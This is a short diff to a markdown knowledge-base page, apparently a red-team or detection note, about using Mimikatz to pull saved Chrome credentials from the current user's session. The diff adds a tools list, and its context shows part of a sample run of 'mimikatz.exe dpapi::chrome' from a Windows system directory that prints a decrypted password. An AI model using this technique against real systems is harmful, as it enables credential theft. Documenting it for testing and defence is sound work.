@@ -20,6 +20,9 @@ output: "C:\\Windows\\System32\\spool\\drivers\\color>mimikatz.exe \"dpapi::chro
   \ with AES-256-GCM\nPassword: SuP3rUnCr4cK4B73\n\nmimikatz # exit\nBye!"
 created_at: '2020-07-21T00:02:06.198050+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Mimikatz]]'
+- '[[PingCastle]]'
 ---
 
 # Mimikatz Extract Chrome Credentials from the Current User's Session
